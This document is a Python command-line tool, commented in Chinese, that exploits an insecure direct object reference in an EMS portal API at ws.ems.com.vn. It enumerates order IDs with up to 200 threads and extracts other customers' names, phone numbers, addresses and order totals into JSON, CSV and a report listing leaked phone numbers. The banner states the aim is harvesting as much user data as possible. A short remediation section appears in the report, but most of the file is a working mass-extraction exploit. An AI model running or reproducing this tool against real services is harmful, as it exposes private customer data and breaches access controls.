#!/usr/bin/env python3
"""
EMS Portal - 批量越权数据提取器
自动扫描并提取所有可访问的订单 (包括其他用户)
"""

import requests
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class MassIDORExtractor:
    def __init__(self, token):
        self.token = token
        self.base_url = "http://ws.ems.com.vn"
        self.headers = {"Authorization": f"Bearer {token}"}
        
        self.total_tested = 0
        self.accessible_orders = []
        self.unauthorized_orders = []  # 其他用户的订单
        self.my_phone = None
        
    def print_banner(self):
        print(f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║       EMS Portal - 批量越权数据提取器                       ║
║       自动扫描所有订单ID，提取其他用户数据                  ║
╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}

{Colors.YELLOW}功能:{Colors.RESET}
  • 多线程高速扫描订单ID
  • 自动识别越权订单 (其他用户)
  • 导出CSV/JSON格式
  • 实时统计分析

{Colors.CYAN}目标: 获取尽可能多的用户订单数据{Colors.RESET}
        """)
    
    def identify_my_phone(self):
        """识别当前Token对应的用户电话"""
        print(f"{Colors.CYAN}[*] 识别当前用户...{Colors.RESET}")
        
        try:
            # 获取自己的订单
            r = requests.get(
                f"{self.base_url}/api/v1/orders/list",
                headers=self.headers,
                params={"limit": 1},
                timeout=5
            )
            
            if r.status_code == 200:
                data = r.json()
                
                if data.get('code') == 'success':
                    orders = data.get('data', {}).get('orders', [])
                    
                    if orders:
                        self.my_phone = orders[0].get('phone')
                        print(f"{Colors.GREEN}[+] 当前用户电话: {self.my_phone}{Colors.RESET}")
                    else:
                        print(f"{Colors.YELLOW}[!] 当前用户没有订单，无法识别{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[!] 获取用户信息失败: {data.get('message')}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] 错误: {e}{Colors.RESET}")
    
    def test_single_order(self, order_id):
        """测试单个订单ID"""
        try:
            r = requests.get(
                f"{self.base_url}/api/v1/orders/tracking/{order_id}",
                headers=self.headers,
                timeout=5
            )
            
            if r.status_code == 200:
                data = r.json()
                
                if data.get('code') == 'success':
                    order_data = data.get('data', {})
                    
                    # 提取关键信息
                    result = {
                        'order_id': order_data.get('id') or order_id,
                        'customer_name': order_data.get('customer_name', 'N/A'),
                        'phone': order_data.get('phone', 'N/A'),
                        'address': order_data.get('address', 'N/A'),
                        'total': order_data.get('total', 0),
                        'status': order_data.get('status', 'N/A'),
                        'created_at': order_data.get('created_at', 'N/A'),
                        'full_data': order_data
                    }
                    
                    # 判断是否是其他用户
                    is_mine = (result['phone'] == self.my_phone) if self.my_phone else False
                    result['is_unauthorized'] = not is_mine and result['phone'] != 'N/A'
                    
                    return result
        
        except Exception as e:
            pass
        
        return None
    
    def scan_range(self, start_id, end_id, workers=50):
        """扫描ID范围"""
        print(f"\n{Colors.CYAN}[*] 扫描范围: {start_id} - {end_id}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] 并发线程: {workers}{Colors.RESET}\n")
        
        total = end_id - start_id
        tested = 0
        found = 0
        unauthorized = 0
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {
                executor.submit(self.test_single_order, order_id): order_id 
                for order_id in range(start_id, end_id)
            }
            
            for future in as_completed(futures):
                tested += 1
                result = future.result()
                
                if result:
                    found += 1
                    self.accessible_orders.append(result)
                    
                    if result['is_unauthorized']:
                        unauthorized += 1
                        self.unauthorized_orders.append(result)
                        
                        print(f"{Colors.RED}[!!!] IDOR! {result['order_id']}: {result['customer_name']} | {result['phone']} | {result['total']:,} VND{Colors.RESET}")
                    else:
                        print(f"{Colors.GREEN}[+] {result['order_id']}: {result['customer_name']} (自己的){Colors.RESET}")
                
                # 进度
                if tested % 100 == 0:
                    elapsed = time.time() - start_time
                    speed = tested / elapsed if elapsed > 0 else 0
                    eta = (total - tested) / speed if speed > 0 else 0
                    
                    print(f"{Colors.YELLOW}[进度] {tested}/{total} ({tested*100/total:.1f}%) | "
                          f"速度:{speed:.1f}/s | 已找到:{found} | 越权:{unauthorized} | "
                          f"ETA:{eta/60:.1f}分钟{Colors.RESET}")
        
        elapsed = time.time() - start_time
        
        print(f"\n{Colors.GREEN}[✓] 扫描完成!{Colors.RESET}")
        print(f"  测试: {tested}")
        print(f"  可访问: {found}")
        print(f"  {Colors.RED}越权订单: {unauthorized}{Colors.RESET}")
        print(f"  耗时: {elapsed:.1f}秒 ({tested/elapsed:.1f}/s)")
    
    def smart_scan(self, workers=100):
        """智能扫描 - 多个范围"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[智能扫描模式]{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        
        # 识别用户
        self.identify_my_phone()
        
        # 多个范围
        ranges = [
            (1, 1000, "小ID"),
            (10000, 11000, "中ID"),
            (100000, 101000, "大ID-1"),
            (1000000, 1010000, "大ID-2"),
        ]
        
        for start, end, name in ranges:
            print(f"\n{Colors.YELLOW}{'='*60}{Colors.RESET}")
            print(f"{Colors.YELLOW}[扫描: {name}]{Colors.RESET}")
            print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")
            
            self.scan_range(start, end, workers)
            
            # 如果找到很多，调整策略
            if len(self.unauthorized_orders) > 100:
                print(f"\n{Colors.GREEN}[!] 已找到大量越权订单，建议扩大扫描范围!{Colors.RESET}")
    
    def export_results(self):
        """导出结果"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[导出结果]{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}\n")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # 1. 完整JSON
        json_file = f"all_orders_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(self.accessible_orders, f, indent=2, ensure_ascii=False)
        print(f"{Colors.GREEN}[+] 完整数据: {json_file}{Colors.RESET}")
        
        # 2. 越权订单JSON
        if self.unauthorized_orders:
            unauthorized_file = f"UNAUTHORIZED_ORDERS_{timestamp}.json"
            with open(unauthorized_file, 'w', encoding='utf-8') as f:
                json.dump(self.unauthorized_orders, f, indent=2, ensure_ascii=False)
            print(f"{Colors.RED}[+] 越权订单: {unauthorized_file}{Colors.RESET}")
        
        # 3. CSV导出
        csv_file = f"orders_{timestamp}.csv"
        import csv
        
        with open(csv_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=[
                'order_id', 'customer_name', 'phone', 'address', 
                'total', 'status', 'is_unauthorized', 'created_at'
            ])
            writer.writeheader()
            
            for order in self.accessible_orders:
                writer.writerow({
                    'order_id': order['order_id'],
                    'customer_name': order['customer_name'],
                    'phone': order['phone'],
                    'address': order['address'],
                    'total': order['total'],
                    'status': order['status'],
                    'is_unauthorized': 'YES' if order['is_unauthorized'] else 'NO',
                    'created_at': order['created_at']
                })
        
        print(f"{Colors.GREEN}[+] CSV数据: {csv_file}{Colors.RESET}")
        
        # 4. 统计报告
        self.generate_report(timestamp)
    
    def generate_report(self, timestamp):
        """生成统计报告"""
        report_file = f"IDOR_REPORT_{timestamp}.txt"
        
        # 计算统计
        total_orders = len(self.accessible_orders)
        unauthorized = len(self.unauthorized_orders)
        
        unique_phones = set(o['phone'] for o in self.unauthorized_orders if o['phone'] != 'N/A')
        
        total_amount = sum(int(o['total']) for o in self.unauthorized_orders if str(o['total']).isdigit())
        
        report = f"""
╔══════════════════════════════════════════════════════════════╗
║           EMS Portal - 越权访问报告                         ║
╚══════════════════════════════════════════════════════════════╝

生成时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

【扫描统计】
  • 总测试订单数: {self.total_tested}
  • 可访问订单: {total_orders}
  • 越权订单 (其他用户): {unauthorized}
  • 越权比例: {unauthorized*100/total_orders if total_orders > 0 else 0:.2f}%

【数据泄露统计】
  • 泄露用户数: {len(unique_phones)}
  • 泄露订单总额: {total_amount:,} VND

【泄露用户电话】
"""
        
        for phone in sorted(unique_phones)[:100]:  # 前100个
            count = sum(1 for o in self.unauthorized_orders if o['phone'] == phone)
            report += f"  • {phone} ({count} 个订单)\n"
        
        if len(unique_phones) > 100:
            report += f"  ... 还有 {len(unique_phones) - 100} 个用户\n"
        
        report += f"""
【漏洞评估】
  严重程度: {"CRITICAL (严重)" if unauthorized > 0 else "无明显越权"}
  CVSS评分: {"9.1 (严重)" if unauthorized > 0 else "N/A"}
  
【影响范围】
  • 可访问所有用户订单信息
  • 泄露姓名、电话、地址
  • 商业敏感数据泄露
  • 用户隐私完全暴露

【修复建议】
  1. 后端验证订单所有权
  2. 检查 user_id 与 order.user_id 匹配
  3. 添加访问日志
  4. 实施Rate Limiting

【攻击演示】
  curl "http://ws.ems.com.vn/api/v1/orders/tracking/{{任意ID}}" \\
    -H "Authorization: Bearer {{TOKEN}}"
  
  → 可访问任意用户订单

【技术细节】
  • 客户端不传递 user_id 参数
  • 后端未验证订单所有权
  • 典型的 IDOR (Insecure Direct Object Reference)
  • 可批量自动化利用

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(report)
        
        print(f"{Colors.CYAN}[+] 报告: {report_file}{Colors.RESET}")
        
        # 输出到终端
        print(report)
    
    def run(self, mode='smart', start=None, end=None, workers=100):
        """运行提取器"""
        self.print_banner()
        
        if mode == 'smart':
            self.smart_scan(workers)
        elif mode == 'range' and start and end:
            self.identify_my_phone()
            self.scan_range(start, end, workers)
        else:
            print(f"{Colors.RED}[!] 无效模式{Colors.RESET}")
            return
        
        # 导出结果
        if self.accessible_orders:
            self.export_results()
            
            # 最终总结
            print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.CYAN}最终总结{Colors.RESET}")
            print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")
            
            if self.unauthorized_orders:
                print(f"{Colors.RED}{Colors.BOLD}[!!!] 确认存在IDOR越权漏洞!{Colors.RESET}")
                print(f"{Colors.RED}成功获取 {len(self.unauthorized_orders)} 个其他用户的订单!{Colors.RESET}")
                print(f"{Colors.RED}泄露 {len(set(o['phone'] for o in self.unauthorized_orders))} 个用户的隐私数据!{Colors.RESET}")
            else:
                print(f"{Colors.GREEN}[✓] 未发现越权订单{Colors.RESET}")
                print(f"{Colors.YELLOW}可能原因:{Colors.RESET}")
                print(f"  1. 后端有权限验证")
                print(f"  2. 测试范围内无其他用户订单")
                print(f"  3. 需要使用真实订单ID测试")
        else:
            print(f"\n{Colors.YELLOW}[!] 没有找到可访问的订单{Colors.RESET}")
            print(f"{Colors.YELLOW}可能原因:{Colors.RESET}")
            print(f"  1. Token无效或过期")
            print(f"  2. 订单ID范围不对")
            print(f"  3. API端点已变更")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='EMS Portal - 批量越权数据提取器',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:

1. 智能扫描 (推荐):
   python3 mass_idor_extractor.py --token "YOUR_TOKEN" --mode smart
   
   自动扫描多个ID范围，识别越权订单

2. 指定范围扫描:
   python3 mass_idor_extractor.py --token "YOUR_TOKEN" --mode range --start 1000000 --end 1100000
   
   扫描指定的订单ID范围

3. 高速扫描:
   python3 mass_idor_extractor.py --token "YOUR_TOKEN" --mode smart --workers 200
   
   使用200个并发线程加速

输出文件:
  • all_orders_*.json          - 所有可访问订单 (JSON)
  • UNAUTHORIZED_ORDERS_*.json - 越权订单 (JSON)
  • orders_*.csv               - CSV格式数据
  • IDOR_REPORT_*.txt          - 详细报告

功能:
  ✓ 自动识别当前用户
  ✓ 批量扫描订单ID
  ✓ 区分自己/其他用户订单
  ✓ 实时进度显示
  ✓ 多格式导出
  ✓ 生成详细报告
        '''
    )
    
    parser.add_argument('--token', required=True, help='Bearer Token')
    parser.add_argument('--mode', choices=['smart', 'range'], default='smart', 
                       help='扫描模式 (smart=智能多范围, range=指定范围)')
    parser.add_argument('--start', type=int, help='起始订单ID (range模式)')
    parser.add_argument('--end', type=int, help='结束订单ID (range模式)')
    parser.add_argument('--workers', type=int, default=100, help='并发线程数 (默认:100)')
    
    args = parser.parse_args()
    
    # 验证参数
    if args.mode == 'range':
        if not args.start or not args.end:
            parser.error("range模式需要 --start 和 --end 参数")
        if args.start >= args.end:
            parser.error("--start 必须小于 --end")
    
    # 运行
    extractor = MassIDORExtractor(args.token)
    extractor.run(
        mode=args.mode,
        start=args.start,
        end=args.end,
        workers=args.workers
    )

if __name__ == '__main__':
    main()
